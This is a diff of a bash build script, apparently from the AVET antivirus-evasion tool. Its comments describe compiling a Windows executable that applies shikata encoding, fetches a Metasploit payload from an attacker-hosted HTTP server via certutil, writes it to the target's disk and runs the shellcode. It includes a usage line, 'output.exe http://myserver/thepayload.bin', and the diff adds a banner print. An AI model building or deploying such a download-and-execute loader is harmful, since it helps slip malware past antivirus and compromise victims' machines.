@@ -1,11 +1,14 @@
 #!/bin/bash          
-# build the .exe file that loads the payload from a given text file
+# Apply shikata, download your payload via certutil.
 
 # The generated msf payload needs to be hosted on a HTTP server
 # Call your payload like:
 # output.exe http://myserver/thepayload.bin
 # The executable will download and drop the payload as a file on the target's disk.
 # It will then execute the shellcode given in the file.
+
+# print AVET logo
+cat banner.txt
 
 # include script containing the compiler var $win32_compiler
 # you can edit the compiler in build/global_win32.sh
